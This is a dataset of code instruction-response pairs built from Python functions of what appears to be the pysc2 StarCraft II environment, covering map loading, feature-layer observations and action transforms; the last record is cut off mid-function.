{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _write(self, request):\n    with sw(\"serialize_request\"):\n      request_str = request.SerializeToString()\n    with sw(\"write_request\"):\n      with catch_websocket_connection_errors():\n        self._sock.send(request_str)", "response": "Actually serialize and write the request."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_maps():\n  maps = {}\n  for mp in Map.all_subclasses():\n    if mp.filename:\n      map_name = mp.__name__\n      if map_name in maps:\n        raise DuplicateMapException(\"Duplicate map found: \" + map_name)\n      maps[map_name] = mp\n  return maps", "response": "Get the full dict of maps."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets an instance of a map by name. Errors if the map doesn t exist.", "response": "def get(map_name):\n  \"\"\"Get an instance of a map by name. Errors if the map doesn't exist.\"\"\"\n  if isinstance(map_name, Map):\n    return map_name\n\n  # Get the list of maps. This isn't at module scope to avoid problems of maps\n  # being defined after this module is imported.\n  maps = get_maps()\n  map_class = maps.get(map_name)\n  if map_class:\n    return map_class()\n  raise NoMapException(\"Map doesn't exist: %s\" % map_name)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef data(self, run_config):\n    try:\n      return run_config.map_data(self.path)\n    except (IOError, OSError) as e:  # Catch both for python 2/3 compatibility.\n      if self.download and hasattr(e, \"filename\"):\n        logging.error(\"Error reading map '%s' from: %s\", self.name, e.filename)\n        logging.error(\"Download the map from: %s\", self.download)\n      raise", "response": "Return the map data."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconverts width height or size to point. Point.", "response": "def _to_point(dims):\n  \"\"\"Convert (width, height) or size -> point.Point.\"\"\"\n  assert dims\n\n  if isinstance(dims, (tuple, list)):\n    if len(dims) != 2:\n      raise ValueError(\n          \"A two element tuple or list is expected here, got {}.\".format(dims))\n    else:\n      width = int(dims[0])\n      height = int(dims[1])\n      if width <= 0 or height <= 0:\n        raise ValueError(\"Must specify +ve dims, got {}.\".format(dims))\n      else:\n        return point.Point(width, height)\n  else:\n    size = int(dims)\n    if size <= 0:\n      raise ValueError(\n          \"Must specify a +ve value for size, got {}.\".format(dims))\n    else:\n      return point.Point(size, size)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nparse the AgentInterfaceFormat object from keyword args.", "response": "def parse_agent_interface_format(\n    feature_screen=None,\n    feature_minimap=None,\n    rgb_screen=None,\n    rgb_minimap=None,\n    action_space=None,\n    camera_width_world_units=None,\n    use_feature_units=False,\n    use_raw_units=False,\n    use_unit_counts=False,\n    use_camera_position=False):\n  \"\"\"Creates an AgentInterfaceFormat object from keyword args.\n\n  Convenient when using dictionaries or command-line arguments for config.\n\n  Note that the feature_* and rgb_* properties define the respective spatial\n  observation dimensions and accept:\n      * None or 0 to disable that spatial observation.\n      * A single int for a square observation with that side length.\n      * A (int, int) tuple for a rectangular (width, height) observation.\n\n  Args:\n    feature_screen: If specified, so must feature_minimap be.\n    feature_minimap: If specified, so must feature_screen be.\n    rgb_screen: If specified, so must rgb_minimap be.\n    rgb_minimap: If specified, so must rgb_screen be.\n    action_space: [\"FEATURES\", \"RGB\"].\n    camera_width_world_units: An int.\n    use_feature_units: A boolean, defaults to False.\n    use_raw_units: A boolean, defaults to False.\n    use_unit_counts: A boolean, defaults to False.\n    use_camera_position: A boolean, defaults to False.\n\n  Returns:\n    An `AgentInterfaceFormat` object.\n\n  Raises:\n    ValueError: If an invalid parameter is specified.\n  \"\"\"\n  if feature_screen or feature_minimap:\n    feature_dimensions = Dimensions(\n        screen=feature_screen,\n        minimap=feature_minimap)\n  else:\n    feature_dimensions = None\n\n  if rgb_screen or rgb_minimap:\n    rgb_dimensions = Dimensions(\n        screen=rgb_screen,\n        minimap=rgb_minimap)\n  else:\n    rgb_dimensions = None\n\n  return AgentInterfaceFormat(\n      feature_dimensions=feature_dimensions,\n      rgb_dimensions=rgb_dimensions,\n      action_space=(action_space and actions.ActionSpace[action_space.upper()]),\n      camera_width_world_units=camera_width_world_units,\n      use_feature_units=use_feature_units,\n      use_raw_units=use_raw_units,\n      use_unit_counts=use_unit_counts,\n      use_camera_position=use_camera_position\n  )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconstructs a Features object from game info.", "response": "def features_from_game_info(\n    game_info,\n    use_feature_units=False,\n    use_raw_units=False,\n    action_space=None,\n    hide_specific_actions=True,\n    use_unit_counts=False,\n    use_camera_position=False):\n  \"\"\"Construct a Features object using data extracted from game info.\n\n  Args:\n    game_info: A `sc_pb.ResponseGameInfo` from the game.\n    use_feature_units: Whether to include the feature unit observation.\n    use_raw_units: Whether to include raw unit data in observations. This\n        differs from feature_units because it includes units outside the\n        screen and hidden units, and because unit positions are given in\n        terms of world units instead of screen units.\n    action_space: If you pass both feature and rgb sizes, then you must also\n        specify which you want to use for your actions as an ActionSpace enum.\n    hide_specific_actions: [bool] Some actions (eg cancel) have many\n        specific versions (cancel this building, cancel that spell) and can\n        be represented in a more general form. If a specific action is\n        available, the general will also be available. If you set\n        `hide_specific_actions` to False, the specific versions will also be\n        available, but if it's True, the specific ones will be hidden.\n        Similarly, when transforming back, a specific action will be returned\n        as the general action. This simplifies the action space, though can\n        lead to some actions in replays not being exactly representable using\n        only the general actions.\n    use_unit_counts: Whether to include unit_counts observation. Disabled by\n        default since it gives information outside the visible area.\n    use_camera_position: Whether to include the camera's position (in world\n        units) in the observations.\n\n  Returns:\n    A features object matching the specified parameterisation.\n\n  \"\"\"\n\n  if game_info.options.HasField(\"feature_layer\"):\n    fl_opts = game_info.options.feature_layer\n    feature_dimensions = Dimensions(\n        screen=(fl_opts.resolution.x, fl_opts.resolution.y),\n        minimap=(fl_opts.minimap_resolution.x, fl_opts.minimap_resolution.y))\n  else:\n    feature_dimensions = None\n\n  if game_info.options.HasField(\"render\"):\n    rgb_opts = game_info.options.render\n    rgb_dimensions = Dimensions(\n        screen=(rgb_opts.resolution.x, rgb_opts.resolution.y),\n        minimap=(rgb_opts.minimap_resolution.x, rgb_opts.minimap_resolution.y))\n  else:\n    rgb_dimensions = None\n\n  map_size = game_info.start_raw.map_size\n  camera_width_world_units = game_info.options.feature_layer.width\n\n  return Features(\n      agent_interface_format=AgentInterfaceFormat(\n          feature_dimensions=feature_dimensions,\n          rgb_dimensions=rgb_dimensions,\n          use_feature_units=use_feature_units,\n          use_raw_units=use_raw_units,\n          use_unit_counts=use_unit_counts,\n          use_camera_position=use_camera_position,\n          camera_width_world_units=camera_width_world_units,\n          action_space=action_space,\n          hide_specific_actions=hide_specific_actions),\n      map_size=map_size)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ninitialize ValidFunctions and set up the callbacks.", "response": "def _init_valid_functions(action_dimensions):\n  \"\"\"Initialize ValidFunctions and set up the callbacks.\"\"\"\n  sizes = {\n      \"screen\": tuple(int(i) for i in action_dimensions.screen),\n      \"screen2\": tuple(int(i) for i in action_dimensions.screen),\n      \"minimap\": tuple(int(i) for i in action_dimensions.minimap),\n  }\n\n  types = actions.Arguments(*[\n      actions.ArgumentType.spec(t.id, t.name, sizes.get(t.name, t.sizes))\n      for t in actions.TYPES])\n\n  functions = actions.Functions([\n      actions.Function.spec(f.id, f.name, tuple(types[t.id] for t in f.args))\n      for f in actions.FUNCTIONS])\n\n  return actions.ValidActions(types, functions)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef unpack(self, obs):\n    planes = getattr(obs.feature_layer_data, self.layer_set)\n    plane = getattr(planes, self.name)\n    return self.unpack_layer(plane)", "response": "Return a correctly shaped numpy array for this feature."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef unpack_layer(plane):\n    size = point.Point.build(plane.size)\n    if size == (0, 0):\n      # New layer that isn't implemented in this SC2 version.\n      return None\n    data = np.frombuffer(plane.data, dtype=Feature.dtypes[plane.bits_per_pixel])\n    if plane.bits_per_pixel == 1:\n      data = np.unpackbits(data)\n      if data.shape[0] != size.x * size.y:\n        # This could happen if the correct length isn't a multiple of 8, leading\n        # to some padding bits at the end of the string which are incorrectly\n        # interpreted as data.\n        data = data[:size.x * size.y]\n    return data.reshape(size.y, size.x)", "response": "Return a correctly shaped numpy array given the feature layer bytes."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a correctly shaped numpy array given the image bytes.", "response": "def unpack_rgb_image(plane):\n    \"\"\"Return a correctly shaped numpy array given the image bytes.\"\"\"\n    assert plane.bits_per_pixel == 24, \"{} != 24\".format(plane.bits_per_pixel)\n    size = point.Point.build(plane.size)\n    data = np.frombuffer(plane.data, dtype=np.uint8)\n    return data.reshape(size.y, size.x, 3)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef init_camera(\n      self, feature_dimensions, map_size, camera_width_world_units):\n    \"\"\"Initialize the camera (especially for feature_units).\n\n    This is called in the constructor and may be called repeatedly after\n    `Features` is constructed, since it deals with rescaling coordinates and not\n    changing environment/action specs.\n\n    Args:\n      feature_dimensions: See the documentation in `AgentInterfaceFormat`.\n      map_size: The size of the map in world units.\n      camera_width_world_units: See the documentation in `AgentInterfaceFormat`.\n\n    Raises:\n      ValueError: If map_size or camera_width_world_units are falsey (which\n          should mainly happen if called by the constructor).\n    \"\"\"\n    if not map_size or not camera_width_world_units:\n      raise ValueError(\n          \"Either pass the game_info with raw enabled, or map_size and \"\n          \"camera_width_world_units in order to use feature_units or camera\"\n          \"position.\")\n    map_size = point.Point.build(map_size)\n    self._world_to_world_tl = transform.Linear(point.Point(1, -1),\n                                               point.Point(0, map_size.y))\n    self._world_tl_to_world_camera_rel = transform.Linear(offset=-map_size / 4)\n    world_camera_rel_to_feature_screen = transform.Linear(\n        feature_dimensions.screen / camera_width_world_units,\n        feature_dimensions.screen / 2)\n    self._world_to_feature_screen_px = transform.Chain(\n        self._world_to_world_tl,\n        self._world_tl_to_world_camera_rel,\n        world_camera_rel_to_feature_screen,\n        transform.PixelToCoord())", "response": "Initialize the camera (especially for feature_units).\n\n    This is called in the constructor and may be called repeatedly after\n    `Features` is constructed, since it deals with rescaling coordinates and not\n    changing environment/action specs.\n\n    Args:\n      feature_dimensions: See the documentation in `AgentInterfaceFormat`.\n      map_size: The size of the map in world units.\n      camera_width_world_units: See the documentation in `AgentInterfaceFormat`.\n\n    Raises:\n      ValueError: If map_size or camera_width_world_units are falsey (which\n          should mainly happen if called by the constructor)."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _update_camera(self, camera_center):\n    self._world_tl_to_world_camera_rel.offset = (\n        -self._world_to_world_tl.fwd_pt(camera_center) *\n        self._world_tl_to_world_camera_rel.scale)", "response": "Update the camera transform based on the new camera center."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef observation_spec(self):\n    obs_spec = named_array.NamedDict({\n        \"action_result\": (0,),  # See error.proto: ActionResult.\n        \"alerts\": (0,),  # See sc2api.proto: Alert.\n        \"available_actions\": (0,),\n        \"build_queue\": (0, len(UnitLayer)),  # pytype: disable=wrong-arg-types\n        \"cargo\": (0, len(UnitLayer)),  # pytype: disable=wrong-arg-types\n        \"cargo_slots_available\": (1,),\n        \"control_groups\": (10, 2),\n        \"game_loop\": (1,),\n        \"last_actions\": (0,),\n        \"multi_select\": (0, len(UnitLayer)),  # pytype: disable=wrong-arg-types\n        \"player\": (len(Player),),  # pytype: disable=wrong-arg-types\n        \"score_cumulative\": (len(ScoreCumulative),),  # pytype: disable=wrong-arg-types\n        \"score_by_category\": (len(ScoreByCategory), len(ScoreCategories)),  # pytype: disable=wrong-arg-types\n        \"score_by_vital\": (len(ScoreByVital), len(ScoreVitals)),  # pytype: disable=wrong-arg-types\n        \"single_select\": (0, len(UnitLayer)),  # Only (n, 7) for n in (0, 1).  # pytype: disable=wrong-arg-types\n    })\n\n    aif = self._agent_interface_format\n\n    if aif.feature_dimensions:\n      obs_spec[\"feature_screen\"] = (len(SCREEN_FEATURES),\n                                    aif.feature_dimensions.screen.y,\n                                    aif.feature_dimensions.screen.x)\n\n      obs_spec[\"feature_minimap\"] = (len(MINIMAP_FEATURES),\n                                     aif.feature_dimensions.minimap.y,\n                                     aif.feature_dimensions.minimap.x)\n    if aif.rgb_dimensions:\n      obs_spec[\"rgb_screen\"] = (aif.rgb_dimensions.screen.y,\n                                aif.rgb_dimensions.screen.x,\n                                3)\n      obs_spec[\"rgb_minimap\"] = (aif.rgb_dimensions.minimap.y,\n                                 aif.rgb_dimensions.minimap.x,\n                                 3)\n    if aif.use_feature_units:\n      obs_spec[\"feature_units\"] = (0, len(FeatureUnit))  # pytype: disable=wrong-arg-types\n\n    if aif.use_raw_units:\n      obs_spec[\"raw_units\"] = (0, len(FeatureUnit))\n\n    if aif.use_unit_counts:\n      obs_spec[\"unit_counts\"] = (0, len(UnitCounts))\n\n    if aif.use_camera_position:\n      obs_spec[\"camera_position\"] = (2,)\n    return obs_spec", "response": "The observation spec for the SC2 environment."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef transform_obs(self, obs):\n    empty = np.array([], dtype=np.int32).reshape((0, 7))\n    out = named_array.NamedDict({  # Fill out some that are sometimes empty.\n        \"single_select\": empty,\n        \"multi_select\": empty,\n        \"build_queue\": empty,\n        \"cargo\": empty,\n        \"cargo_slots_available\": np.array([0], dtype=np.int32),\n    })\n\n    def or_zeros(layer, size):\n      if layer is not None:\n        return layer.astype(np.int32, copy=False)\n      else:\n        return np.zeros((size.y, size.x), dtype=np.int32)\n\n    aif = self._agent_interface_format\n\n    if aif.feature_dimensions:\n      out[\"feature_screen\"] = named_array.NamedNumpyArray(\n          np.stack(or_zeros(f.unpack(obs.observation),\n                            aif.feature_dimensions.screen)\n                   for f in SCREEN_FEATURES),\n          names=[ScreenFeatures, None, None])\n      out[\"feature_minimap\"] = named_array.NamedNumpyArray(\n          np.stack(or_zeros(f.unpack(obs.observation),\n                            aif.feature_dimensions.minimap)\n                   for f in MINIMAP_FEATURES),\n          names=[MinimapFeatures, None, None])\n\n    if aif.rgb_dimensions:\n      out[\"rgb_screen\"] = Feature.unpack_rgb_image(\n          obs.observation.render_data.map).astype(np.int32)\n      out[\"rgb_minimap\"] = Feature.unpack_rgb_image(\n          obs.observation.render_data.minimap).astype(np.int32)\n\n    out[\"last_actions\"] = np.array(\n        [self.reverse_action(a).function for a in obs.actions],\n        dtype=np.int32)\n\n    out[\"action_result\"] = np.array([o.result for o in obs.action_errors],\n                                    dtype=np.int32)\n\n    out[\"alerts\"] = np.array(obs.observation.alerts, dtype=np.int32)\n\n    out[\"game_loop\"] = np.array([obs.observation.game_loop], dtype=np.int32)\n\n    score_details = obs.observation.score.score_details\n    out[\"score_cumulative\"] = named_array.NamedNumpyArray([\n        obs.observation.score.score,\n        score_details.idle_production_time,\n        score_details.idle_worker_time,\n        score_details.total_value_units,\n        score_details.total_value_structures,\n        score_details.killed_value_units,\n        score_details.killed_value_structures,\n        score_details.collected_minerals,\n        score_details.collected_vespene,\n        score_details.collection_rate_minerals,\n        score_details.collection_rate_vespene,\n        score_details.spent_minerals,\n        score_details.spent_vespene,\n    ], names=ScoreCumulative, dtype=np.int32)\n\n    def get_score_details(key, details, categories):\n      row = getattr(details, key.name)\n      return [getattr(row, category.name) for category in categories]\n\n    out[\"score_by_category\"] = named_array.NamedNumpyArray([\n        get_score_details(key, score_details, ScoreCategories)\n        for key in ScoreByCategory\n    ], names=[ScoreByCategory, ScoreCategories], dtype=np.int32)\n\n    out[\"score_by_vital\"] = named_array.NamedNumpyArray([\n        get_score_details(key, score_details, ScoreVitals)\n        for key in ScoreByVital\n    ], names=[ScoreByVital, ScoreVitals], dtype=np.int32)\n\n    player = obs.observation.player_common\n    out[\"player\"] = named_array.NamedNumpyArray([\n        player.player_id,\n        player.minerals,\n        player.vespene,\n        player.food_used,\n        player.food_cap,\n        player.food_army,\n        player.food_workers,\n        player.idle_worker_count,\n        player.army_count,\n        player.warp_gate_count,\n        player.larva_count,\n    ], names=Player, dtype=np.int32)\n\n    def unit_vec(u):\n      return np.array((\n          u.unit_type,\n          u.player_relative,\n          u.health,\n          u.shields,\n          u.energy,\n          u.transport_slots_taken,\n          int(u.build_progress * 100),  # discretize\n      ), dtype=np.int32)\n\n    ui = obs.observation.ui_data\n\n    with sw(\"ui\"):\n      groups = np.zeros((10, 2), dtype=np.int32)\n      for g in ui.groups:\n        groups[g.control_group_index, :] = (g.leader_unit_type, g.count)\n      out[\"control_groups\"] = groups\n\n      if ui.single:\n        out[\"single_select\"] = named_array.NamedNumpyArray(\n            [unit_vec(ui.single.unit)], [None, UnitLayer])\n\n      if ui.multi and ui.multi.units:\n        out[\"multi_select\"] = named_array.NamedNumpyArray(\n            [unit_vec(u) for u in ui.multi.units], [None, UnitLayer])\n\n      if ui.cargo and ui.cargo.passengers:\n        out[\"single_select\"] = named_array.NamedNumpyArray(\n            [unit_vec(ui.single.unit)], [None, UnitLayer])\n        out[\"cargo\"] = named_array.NamedNumpyArray(\n            [unit_vec(u) for u in ui.cargo.passengers], [None, UnitLayer])\n        out[\"cargo_slots_available\"] = np.array([ui.cargo.slots_available],\n                                                dtype=np.int32)\n\n      if ui.production and ui.production.build_queue:\n        out[\"single_select\"] = named_array.NamedNumpyArray(\n            [unit_vec(ui.production.unit)], [None, UnitLayer])\n        out[\"build_queue\"] = named_array.NamedNumpyArray(\n            [unit_vec(u) for u in ui.production.build_queue],\n            [None, UnitLayer])\n\n    def full_unit_vec(u, pos_transform, is_raw=False):\n      screen_pos = pos_transform.fwd_pt(\n          point.Point.build(u.pos))\n      screen_radius = pos_transform.fwd_dist(u.radius)\n      return np.array((\n          # Match unit_vec order\n          u.unit_type,\n          u.alliance,  # Self = 1, Ally = 2, Neutral = 3, Enemy = 4\n          u.health,\n          u.shield,\n          u.energy,\n          u.cargo_space_taken,\n          int(u.build_progress * 100),  # discretize\n\n          # Resume API order\n          int(u.health / u.health_max * 255) if u.health_max > 0 else 0,\n          int(u.shield / u.shield_max * 255) if u.shield_max > 0 else 0,\n          int(u.energy / u.energy_max * 255) if u.energy_max > 0 else 0,\n          u.display_type,  # Visible = 1, Snapshot = 2, Hidden = 3\n          u.owner,  # 1-15, 16 = neutral\n          screen_pos.x,\n          screen_pos.y,\n          u.facing,\n          screen_radius,\n          u.cloak,  # Cloaked = 1, CloakedDetected = 2, NotCloaked = 3\n          u.is_selected,\n          u.is_blip,\n          u.is_powered,\n          u.mineral_contents,\n          u.vespene_contents,\n\n          # Not populated for enemies or neutral\n          u.cargo_space_max,\n          u.assigned_harvesters,\n          u.ideal_harvesters,\n          u.weapon_cooldown,\n          len(u.orders),\n          u.tag if is_raw else 0\n      ), dtype=np.int32)\n\n    raw = obs.observation.raw_data\n\n    if aif.use_feature_units:\n      with sw(\"feature_units\"):\n        # Update the camera location so we can calculate world to screen pos\n        self._update_camera(point.Point.build(raw.player.camera))\n        feature_units = []\n        for u in raw.units:\n          if u.is_on_screen and u.display_type != sc_raw.Hidden:\n            feature_units.append(\n                full_unit_vec(u, self._world_to_feature_screen_px))\n        out[\"feature_units\"] = named_array.NamedNumpyArray(\n            feature_units, [None, FeatureUnit], dtype=np.int32)\n\n    if aif.use_raw_units:\n      with sw(\"raw_units\"):\n        raw_units = [full_unit_vec(u, self._world_to_world_tl, is_raw=True)\n                     for u in raw.units]\n        out[\"raw_units\"] = named_array.NamedNumpyArray(\n            raw_units, [None, FeatureUnit], dtype=np.int32)\n\n    if aif.use_unit_counts:\n      with sw(\"unit_counts\"):\n        unit_counts = collections.defaultdict(int)\n        for u in raw.units:\n          if u.alliance == sc_raw.Self:\n            unit_counts[u.unit_type] += 1\n        out[\"unit_counts\"] = named_array.NamedNumpyArray(\n            sorted(unit_counts.items()), [None, UnitCounts], dtype=np.int32)\n\n    if aif.use_camera_position:\n      camera_position = self._world_to_world_tl.fwd_pt(\n          point.Point.build(raw.player.camera))\n      out[\"camera_position\"] = np.array((camera_position.x, camera_position.y),\n                                        dtype=np.int32)\n\n    out[\"available_actions\"] = np.array(self.available_actions(obs.observation),\n                                        dtype=np.int32)\n\n    return out", "response": "Transform some SC2 observations into something an agent can handle."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the list of available action ids.", "response": "def available_actions(self, obs):\n    \"\"\"Return the list of available action ids.\"\"\"\n    available_actions = set()\n    hide_specific_actions = self._agent_interface_format.hide_specific_actions\n    for i, func in six.iteritems(actions.FUNCTIONS_AVAILABLE):\n      if func.avail_fn(obs):\n        available_actions.add(i)\n    for a in obs.abilities:\n      if a.ability_id not in actions.ABILITY_IDS:\n        logging.warning(\"Unknown ability %s seen as available.\", a.ability_id)\n        continue\n      for func in actions.ABILITY_IDS[a.ability_id]:\n        if func.function_type in actions.POINT_REQUIRED_FUNCS[a.requires_point]:\n          if func.general_id == 0 or not hide_specific_actions:\n            available_actions.add(func.id)\n          if func.general_id != 0:  # Always offer generic actions.\n            for general_func in actions.ABILITY_IDS[func.general_id]:\n              if general_func.function_type is func.function_type:\n                # Only the right type. Don't want to expose the general action\n                # to minimap if only the screen version is available.\n                available_actions.add(general_func.id)\n                break\n    return list(available_actions)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef transform_action(self, obs, func_call, skip_available=False):\n    func_id = func_call.function\n    try:\n      func = actions.FUNCTIONS[func_id]\n    except KeyError:\n      raise ValueError(\"Invalid function id: %s.\" % func_id)\n\n    # Available?\n    if not (skip_available or func_id in self.available_actions(obs)):\n      raise ValueError(\"Function %s/%s is currently not available\" % (\n          func_id, func.name))\n\n    # Right number of args?\n    if len(func_call.arguments) != len(func.args):\n      raise ValueError(\n          \"Wrong number of arguments for function: %s, got: %s\" % (\n              func, func_call.arguments))\n\n    # Args are valid?\n    aif = self._agent_interface_format\n    for t, arg in zip(func.args, func_call.arguments):\n      if t.name in (\"screen\", \"screen2\"):\n        sizes = aif.action_dimensions.screen\n      elif t.name == \"minimap\":\n        sizes = aif.action_dimensions.minimap\n      else:\n        sizes = t.sizes\n\n      if len(sizes) != len(arg):\n        raise ValueError(\n            \"Wrong number of values for argument of %s, got: %s\" % (\n                func, func_call.arguments))\n\n      for s, a in zip(sizes, arg):\n        if not 0 <= a < s:\n          raise ValueError(\"Argument is out of range for %s, got: %s\" % (\n              func, func_call.arguments))\n\n    # Convert them to python types.\n    kwargs = {type_.name: type_.fn(a)\n              for type_, a in zip(func.args, func_call.arguments)}\n\n    # Call the right callback to get an SC2 action proto.\n    sc2_action = sc_pb.Action()\n    kwargs[\"action\"] = sc2_action\n    kwargs[\"action_space\"] = aif.action_space\n    if func.ability_id:\n      kwargs[\"ability_id\"] = func.ability_id\n    actions.FUNCTIONS[func_id].function_type(**kwargs)\n    return sc2_action", "response": "Transform an agent - style action to one that SC2 can consume."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef reverse_action(self, action):\n    FUNCTIONS = actions.FUNCTIONS  # pylint: disable=invalid-name\n\n    aif = self._agent_interface_format\n\n    def func_call_ability(ability_id, cmd_type, *args):\n      \"\"\"Get the function id for a specific ability id and action type.\"\"\"\n      if ability_id not in actions.ABILITY_IDS:\n        logging.warning(\"Unknown ability_id: %s. This is probably dance or \"\n                        \"cheer, or some unknown new or map specific ability. \"\n                        \"Treating it as a no-op.\", ability_id)\n        return FUNCTIONS.no_op()\n\n      if aif.hide_specific_actions:\n        general_id = next(iter(actions.ABILITY_IDS[ability_id])).general_id\n        if general_id:\n          ability_id = general_id\n\n      for func in actions.ABILITY_IDS[ability_id]:\n        if func.function_type is cmd_type:\n          return FUNCTIONS[func.id](*args)\n      raise ValueError(\"Unknown ability_id: %s, type: %s. Likely a bug.\" % (\n          ability_id, cmd_type.__name__))\n\n    if action.HasField(\"action_ui\"):\n      act_ui = action.action_ui\n      if act_ui.HasField(\"multi_panel\"):\n        return FUNCTIONS.select_unit(act_ui.multi_panel.type - 1,\n                                     act_ui.multi_panel.unit_index)\n      if act_ui.HasField(\"control_group\"):\n        return FUNCTIONS.select_control_group(\n            act_ui.control_group.action - 1,\n            act_ui.control_group.control_group_index)\n      if act_ui.HasField(\"select_idle_worker\"):\n        return FUNCTIONS.select_idle_worker(act_ui.select_idle_worker.type - 1)\n      if act_ui.HasField(\"select_army\"):\n        return FUNCTIONS.select_army(act_ui.select_army.selection_add)\n      if act_ui.HasField(\"select_warp_gates\"):\n        return FUNCTIONS.select_warp_gates(\n            act_ui.select_warp_gates.selection_add)\n      if act_ui.HasField(\"select_larva\"):\n        return FUNCTIONS.select_larva()\n      if act_ui.HasField(\"cargo_panel\"):\n        return FUNCTIONS.unload(act_ui.cargo_panel.unit_index)\n      if act_ui.HasField(\"production_panel\"):\n        return FUNCTIONS.build_queue(act_ui.production_panel.unit_index)\n      if act_ui.HasField(\"toggle_autocast\"):\n        return func_call_ability(act_ui.toggle_autocast.ability_id,\n                                 actions.autocast)\n\n    if (action.HasField(\"action_feature_layer\") or\n        action.HasField(\"action_render\")):\n      act_sp = actions.spatial(action, aif.action_space)\n      if act_sp.HasField(\"camera_move\"):\n        coord = point.Point.build(act_sp.camera_move.center_minimap)\n        return FUNCTIONS.move_camera(coord)\n      if act_sp.HasField(\"unit_selection_point\"):\n        select_point = act_sp.unit_selection_point\n        coord = point.Point.build(select_point.selection_screen_coord)\n        return FUNCTIONS.select_point(select_point.type - 1, coord)\n      if act_sp.HasField(\"unit_selection_rect\"):\n        select_rect = act_sp.unit_selection_rect\n        # TODO(tewalds): After looking at some replays we should decide if\n        # this is good enough. Maybe we need to simulate multiple actions or\n        # merge the selection rects into a bigger one.\n        tl = point.Point.build(select_rect.selection_screen_coord[0].p0)\n        br = point.Point.build(select_rect.selection_screen_coord[0].p1)\n        return FUNCTIONS.select_rect(select_rect.selection_add, tl, br)\n      if act_sp.HasField(\"unit_command\"):\n        cmd = act_sp.unit_command\n        queue = int(cmd.queue_command)\n        if cmd.HasField(\"target_screen_coord\"):\n          coord = point.Point.build(cmd.target_screen_coord)\n          return func_call_ability(cmd.ability_id, actions.cmd_screen,\n                                   queue, coord)\n        elif cmd.HasField(\"target_minimap_coord\"):\n          coord = point.Point.build(cmd.target_minimap_coord)\n          return func_call_ability(cmd.ability_id, actions.cmd_minimap,\n                                   queue, coord)\n        else:\n          return func_call_ability(cmd.ability_id, actions.cmd_quick, queue)\n\n    if action.HasField(\"action_raw\") or action.HasField(\"action_render\"):\n      raise ValueError(\"Unknown action:\\n%s\" % action)\n\n    return FUNCTIONS.no_op()", "response": "Transform an action into an agent - style action."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _xy_locs(mask):\n  y, x = mask.nonzero()\n  return list(zip(x, y))", "response": "Returns a list of indices of the x y values in the mask."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrunning SC2 to play a game or a replay.", "response": "def main(unused_argv):\n  \"\"\"Run SC2 to play a game or a replay.\"\"\"\n  stopwatch.sw.enabled = FLAGS.profile or FLAGS.trace\n  stopwatch.sw.trace = FLAGS.trace\n\n  if (FLAGS.map and FLAGS.replay) or (not FLAGS.map and not FLAGS.replay):\n    sys.exit(\"Must supply either a map or replay.\")\n\n  if FLAGS.replay and not FLAGS.replay.lower().endswith(\"sc2replay\"):\n    sys.exit(\"Replay must end in .SC2Replay.\")\n\n  if FLAGS.realtime and FLAGS.replay:\n    # TODO(tewalds): Support realtime in replays once the game supports it.\n    sys.exit(\"realtime isn't possible for replays yet.\")\n\n  if FLAGS.render and (FLAGS.realtime or FLAGS.full_screen):\n    sys.exit(\"disable pygame rendering if you want realtime or full_screen.\")\n\n  if platform.system() == \"Linux\" and (FLAGS.realtime or FLAGS.full_screen):\n    sys.exit(\"realtime and full_screen only make sense on Windows/MacOS.\")\n\n  if not FLAGS.render and FLAGS.render_sync:\n    sys.exit(\"render_sync only makes sense with pygame rendering on.\")\n\n  run_config = run_configs.get()\n\n  interface = sc_pb.InterfaceOptions()\n  interface.raw = FLAGS.render\n  interface.score = True\n  interface.feature_layer.width = 24\n  if FLAGS.feature_screen_size and FLAGS.feature_minimap_size:\n    FLAGS.feature_screen_size.assign_to(interface.feature_layer.resolution)\n    FLAGS.feature_minimap_size.assign_to(\n        interface.feature_layer.minimap_resolution)\n  if FLAGS.rgb_screen_size and FLAGS.rgb_minimap_size:\n    FLAGS.rgb_screen_size.assign_to(interface.render.resolution)\n    FLAGS.rgb_minimap_size.assign_to(interface.render.minimap_resolution)\n\n  max_episode_steps = FLAGS.max_episode_steps\n\n  if FLAGS.map:\n    map_inst = maps.get(FLAGS.map)\n    if map_inst.game_steps_per_episode:\n      max_episode_steps = map_inst.game_steps_per_episode\n    create = sc_pb.RequestCreateGame(\n        realtime=FLAGS.realtime,\n        disable_fog=FLAGS.disable_fog,\n        local_map=sc_pb.LocalMap(map_path=map_inst.path,\n                                 map_data=map_inst.data(run_config)))\n    create.player_setup.add(type=sc_pb.Participant)\n    create.player_setup.add(type=sc_pb.Computer,\n                            race=sc2_env.Race[FLAGS.bot_race],\n                            difficulty=sc2_env.Difficulty[FLAGS.difficulty])\n    join = sc_pb.RequestJoinGame(\n        options=interface, race=sc2_env.Race[FLAGS.user_race],\n        player_name=FLAGS.user_name)\n    version = None\n  else:\n    replay_data = run_config.replay_data(FLAGS.replay)\n    start_replay = sc_pb.RequestStartReplay(\n        replay_data=replay_data,\n        options=interface,\n        disable_fog=FLAGS.disable_fog,\n        observed_player_id=FLAGS.observed_player)\n    version = 